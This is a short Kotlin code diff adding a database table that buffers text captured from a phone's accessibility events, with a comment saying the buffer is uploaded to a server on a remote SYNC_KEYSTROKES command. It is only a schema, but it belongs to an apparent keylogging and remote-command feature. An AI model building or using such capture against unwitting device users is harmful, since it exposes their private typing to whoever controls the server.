@@ -26,3 +26,18 @@ data class CommandEntity(
     val timestamp: Long,
     val completionTimestamp: Long?
 )
+
+/**
+ * Local buffer of accessibility text events (captured only while the device
+ * user has enabled the accessibility service). Synced to the server on the
+ * SYNC_KEYSTROKES command.
+ */
+@Entity(tableName = "keystroke_log")
+data class KeystrokeEntity(
+    @PrimaryKey(autoGenerate = true)
+    val id: Long = 0,
+    val appPackage: String,
+    val appName: String,
+    val text: String,
+    val timestamp: Long = System.currentTimeMillis()
+)
